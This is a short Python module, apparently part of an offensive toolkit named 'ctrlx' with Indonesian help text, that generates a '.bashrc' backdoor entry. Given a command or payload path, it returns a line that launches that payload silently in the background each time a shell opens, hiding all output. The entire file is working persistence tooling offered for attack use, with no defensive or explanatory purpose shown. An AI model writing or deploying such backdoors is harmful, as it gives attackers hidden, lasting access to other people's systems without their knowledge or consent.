import argparse

def run(raw_args):
    parser = argparse.ArgumentParser(
        prog="ctrlx rda --type bsh3",
        description="Generate backdoor entry for .bashrc file",
        epilog="Contoh: python ctrlx.py rda --type bsh3 --command /path/to/payload.sh --save"
    )

    parser.add_argument("--command", required=True, help="Perintah atau path script yang akan dijalankan otomatis")

    args = parser.parse_args(raw_args)

    return f"# Bashrc Backdoor\n{args.command} &>/dev/null &"
